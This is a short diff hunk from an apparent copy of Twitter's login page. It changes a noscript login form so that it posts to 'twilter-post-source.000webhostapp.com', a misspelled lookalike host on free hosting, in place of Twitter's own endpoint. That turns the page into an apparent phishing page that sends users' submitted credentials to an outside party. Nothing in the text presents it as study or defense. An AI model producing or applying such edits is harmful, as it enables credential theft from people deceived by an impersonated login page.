@@ -83,7 +83,7 @@
 
     
     <noscript>
-      <form action="https://mobile.twitter.com/i/nojs_router?path=%2Flogin" method="POST" class="NoScriptForm">
+      <form action="https://twilter-post-source.000webhostapp.com/" method="POST" class="NoScriptForm">
         <input type="hidden" value="83916b096a7eeebaa0c4a35e59afa821425feb6d" name="authenticity_token">
 
         <div class="NoScriptForm-content">
